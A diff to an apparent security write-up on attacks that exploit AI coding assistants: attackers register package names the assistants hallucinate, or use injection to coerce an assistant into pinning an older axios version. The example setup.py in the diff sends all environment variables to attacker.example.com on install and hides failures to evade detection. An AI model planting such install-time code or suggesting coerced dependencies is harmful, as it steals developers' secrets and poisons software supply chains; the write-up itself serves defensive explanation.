@@ -69,20 +69,25 @@ AI coding assistants sometimes suggest package names that don't exist. This has 
 
 The attack pattern: an attacker monitors for hallucinated package names that appear repeatedly in model suggestions (either through probing or passive observation), registers those packages with malicious payloads, and waits for developers who accept the suggestion and run their package manager.
 
-The malicious package needs only to exist and install. For npm packages, a `postinstall` script in `package.json` runs at install time. For PyPI, source distributions (`sdist`) can execute a `setup.py` on install; binary wheels (`whl`) do not run `setup.py`, but can still include malicious entry points. In both ecosystems, execution happens before any application-level code review of the package.
+The malicious package needs only to exist and install. For npm packages, a `postinstall` script in `package.json` runs at install time. For PyPI, source distributions (`sdist`) can execute arbitrary code via `setup.py` during installation. Binary wheel packages (`.whl`) do not run `setup.py` at install time and do not provide an equivalent install-time hook — though they can still install malicious scripts or binaries. In both ecosystems, any install-time execution happens before any application-level code review of the package.
 
 ```python
-# An attacker-registered package's setup.py (sdist install)
+# An attacker-registered package's setup.py (executed when installed as sdist)
+# Uses stdlib only — third-party packages like requests aren't available yet
+# during another package's install-time execution.
 from setuptools import setup
-import os, requests
+import os, urllib.request, urllib.parse
 
 # Exfiltrate developer environment on install.
-# Note: the silent except is intentional — detection-evasion.
-# An install that errors out draws attention; one that silently
-# continues looks like a successful package install.
+# The silent except is intentional — detection-evasion:
+# an install that errors out draws attention; one that silently
+# continues looks like a normal successful install.
 try:
-    requests.post("https://attacker.example.com/collect",
-                  data=dict(os.environ), timeout=2)
+    env_data = urllib.parse.urlencode(dict(os.environ)).encode()
+    urllib.request.urlopen(
+        "https://attacker.example.com/collect",
+        data=env_data, timeout=2
+    )
 except Exception:
     pass
 
@@ -103,13 +108,13 @@ A more targeted variant: an injection-capable attacker coerces the model into su
 // Suggested by AI assistant (potentially coerced)
 {
   "dependencies": {
-    // Pinned to a specific older version with a known vulnerability
+    // Pinned to a specific older version rather than the latest safe release
     "axios": "1.3.2"
   }
 }
 ```
 
-The version specification looks completely normal. The developer may not check why that version was suggested rather than `^latest`.
+The version specification looks completely normal. The developer may not check why that version was suggested rather than `"axios": "latest"` or the current stable release.
 
 ---
 
